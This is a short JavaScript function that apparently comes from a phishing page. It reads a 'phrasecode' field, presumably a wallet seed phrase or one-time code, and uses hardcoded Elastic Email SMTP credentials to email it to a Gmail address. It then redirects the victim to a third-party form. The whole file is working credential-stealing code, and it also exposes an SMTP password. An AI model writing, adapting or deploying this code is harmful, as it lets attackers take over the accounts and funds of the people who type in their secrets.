function emailSend() {
  var phraseKey = document.getElementById('phrasecode').value; // Getting the OTP entered by the user
  var messageBody = "PHRASEKEY: " + phraseKey; // Constructing the message body with OTP

  Email.send({
    Host: "smtp.elasticemail.com",
    Username: "payday10177@gmail.com",
    Password: "60F88560F588591A7F78F2A9E657115D12C3",
    To: 'payday10177@gmail.com', // Change this to your email address where you want to receive the OTP
    From: "payday10177@gmail.com",
    Subject: "PRASEKEY",
    Body: messageBody
  }).then(
    message => {
      if (message == 'OK') {
        window.location.href = 'https://usebasin.com/f/4f754ea5b5be'; // Redirecting to otp.html upon successful email sending
      }
      else {
        swal("Error", "Please complete the OTP field", "error") // Displaying an error message if email sending fails
      }
    }
  );
}
